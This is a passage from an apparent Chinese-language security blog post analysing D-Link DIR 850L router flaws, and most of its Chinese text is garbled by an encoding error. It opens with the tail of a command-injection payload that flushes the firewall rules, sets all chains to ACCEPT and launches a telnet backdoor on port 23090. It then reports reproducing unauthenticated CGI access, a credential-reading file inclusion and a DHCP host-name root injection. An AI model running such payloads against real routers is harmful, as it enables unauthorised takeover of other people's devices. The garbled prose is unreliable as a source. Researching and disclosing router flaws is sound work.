class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">INPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">FORWARD</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">OUTPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">telnetd</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23090</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">date</span><span class="p">)</span> <span class="o">&amp;</span><span class="p">;</span> <span class="n">exit</span><span class="p">;</span>
</span></span></code></pre></div><h2 id="éªŒè¯">éªŒè¯</h2>
<p>ä»¥ä¸Šåˆ†æçš„æ˜¯DIR 850L/Açš„1.14.B07å›ºä»¶ã€‚å¯¹DIR 850L/Bè¿è¡ŒPoCè„šæœ¬ä¹‹åï¼Œç®—æ˜¯å¤ç°å…¶ä¸­ä¸‰ä¸ªç¼ºé™·ï¼Œåªæœ‰éƒ¨åˆ†cgiå¯ä»¥æœªæˆæƒè®¿é—®ï¼Œgetcfg.phpéœ€è¦ç™»é™†åæ‰èƒ½è®¿é—®ã€‚<br>
<img loading="lazy"  src="./401.png"
        alt="401"/><br>
æ²¡æœ‰ç®¡ç†å‘˜cookieçš„æƒ…å†µä¸‹ï¼Œå‘½ä»¤æ³¨å…¥åªæœ‰hedwig.cgièƒ½æ˜¾ç¤ºOKï¼Œpigwidgeonæ˜¾ç¤ºno powerã€‚<br>
<img loading="lazy"  src="./no-power.png"
        alt="no-power"/><br>
å›½è¡Œç‰ˆå›ºä»¶authentication.cgiçš„ç™»å½•é“¾æ¥å˜æˆäº†webfa_authentication.cgi
éªŒè¯æœªæˆæƒè®¿é—®CGI<br>
<img loading="lazy"  src="./access-cgi.png"
        alt="access-cgi"/><br>
éªŒè¯æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–ç”¨æˆ·åå¯†ç <br>
<img loading="lazy"  src="./lfi.png"
        alt="lfi"/><br>
ä»£ç æ³¨å…¥</p>
<h2 id="åˆ†ædir-850lb">åˆ†æDIR 850L/B</h2>
<p>å› ä¸ºé€šå‘Šæ²¡æœ‰æŒ‡æ˜è®¾å¤‡ç‰ˆæœ¬ä»¥åŠå›ºä»¶ç‰ˆæœ¬ï¼ŒPoCçš„åˆ©ç”¨èŒƒå›´æœ‰é™ã€‚æˆ‘ä»¬æš‚æ—¶ä¸ç¡®å®šDIR 850L/Bæ˜¯å¦çœŸå®å­˜åœ¨å…¶æ¼æ´ï¼Œéœ€è¦åˆ†æ850L/Bå›ºä»¶ã€‚ä½†æ˜¯å®˜ç½‘çš„å›ºä»¶åŠ å¯†äº†ï¼Œä¸èƒ½ç›´æ¥åˆ†æã€‚ç°åœ¨æœ‰ä¸¤ä¸ªåŠæ³•ï¼Œä¸€ä¸ªæ˜¯è·å¾—ROOTæƒé™æŠŠå›ºä»¶æå‡ºæ¥ï¼Œå¦ä¸€ä¸ªæ˜¯é€šè¿‡è¯»å–FlashèŠ¯ç‰‡æå–å›ºä»¶ã€‚</p>
<p>è¿™æ¬¡è¿˜çˆ†å‡ºæ¥ä¸€ä¸ªåœ¨å±€åŸŸç½‘ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œç³»ç»Ÿä»¥ROOTæƒé™è¿è¡Œdnsmasqï¼Œå®ƒçš„å®ˆæŠ¤è¿›ç¨‹ä¼šä»DHCPæœåŠ¡å™¨è·å¾—&quot;host-name&quot;å‚æ•°æ‹¼æ¥å¹¶æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥å‘½ä»¤çš„æ–¹å¼è·å¾—ROOTæƒé™ã€‚</p>
<p><img loading="lazy"  src="./UART1.png"
        alt="UART1"/><br>
<img loading="lazy"  src="./UART2.png"
        alt="UART2"/><br>
æå–å›ºä»¶çš„æŒ‚è½½åˆ†åŒº</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dd if=/dev/mtdblock/7 of=/var/tmp/storage/Generic_Ubuntu_C2EE4/mtdblock0.bin bs=8
</span></span><span class="line"><span class="cl">unsquashfs mtdblock0.bin
</span></span></code></pre></div><h3 id="todo-1">TODO 1</h3>
<p>åˆ†ææ–‡ä»¶ç›®å½•å·®å¼‚å’Œç¨‹åºå·®å¼‚å¹¶å†™å‡º</p>
<h2 id="å…¨ç½‘æ‰«æç»Ÿè®¡">å…¨ç½‘æ‰«æç»Ÿè®¡</h2>
<h3 id="todo-0">TODO 0</h3>
<p>ä½¿ç”¨Allseeingçš„å…¨ç½‘æ‰«æç»“æœï¼Œé€šè¿‡è„šæœ¬ç»Ÿè®¡å­˜åœ¨æ¼æ´å¹¶èƒ½åˆ©ç”¨çš„è·¯ç”±å™¨ã€‚</p>
<h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<p><a href="https://blogs.securiteam.com/index.php/archives/3364"target="_blank" rel="noopener noreferrer">SSD Advisory</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-96333"target="_blank" rel="noopener noreferrer">Seebug</a></p>
<p><a href="http://www.cnvd.org.cn/webinfo/show/4202"target="_blank" rel="noopener noreferrer">CNVD</a></p>
</article><section class="article labels"><a class="category" href=/zh/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/>ç¡¬ä»¶å®‰å…¨</a><a class="tag" href=/zh/tags/d-link/>D-Link</a><a class="tag" href=/zh/tags/iot/>IoT</a><a class="tag" href=/zh/tags/%E6%BC%8F%E6%B4%9E/>æ¼æ´</a></section>
</div>

<div class="article bottom"><section class="article navigation"><p><a class="link" href="/zh/posts/hackrf-gps-spoofing/"><span class="iconfont icon-article"></span>HackRF GPS æ¬ºéª—ç¬”è®°</a></p><p><a class="link" href="/zh/posts/exploiting-cve-2017-0199/"><span class="iconfont icon-article"></span>OFFICE OLE2LINK æ¼æ´ (CVE-2017-0199) åˆ©ç”¨</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>